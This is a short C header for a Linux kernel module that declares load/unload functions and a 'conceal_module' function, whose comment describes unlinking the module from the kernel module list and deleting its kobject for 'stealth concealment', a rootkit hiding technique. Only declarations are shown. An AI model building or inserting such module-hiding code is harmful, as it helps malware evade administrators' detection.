// SPDX-License-Identifier: GPL-2.0
// module load/unload and stealth concealment.
#ifndef DRIVER_LIFECYCLE_H
#define DRIVER_LIFECYCLE_H

#include <linux/init.h>
#include <linux/module.h>

int __init init_driver(void);

void __exit cleanup_driver(void);

/* Inlined list_del on __this_module.list, stamps LIST_POISON1/2, kobject_del (mkobj). Safe to call only once. */
void conceal_module(void);

#endif /* DRIVER_LIFECYCLE_H */
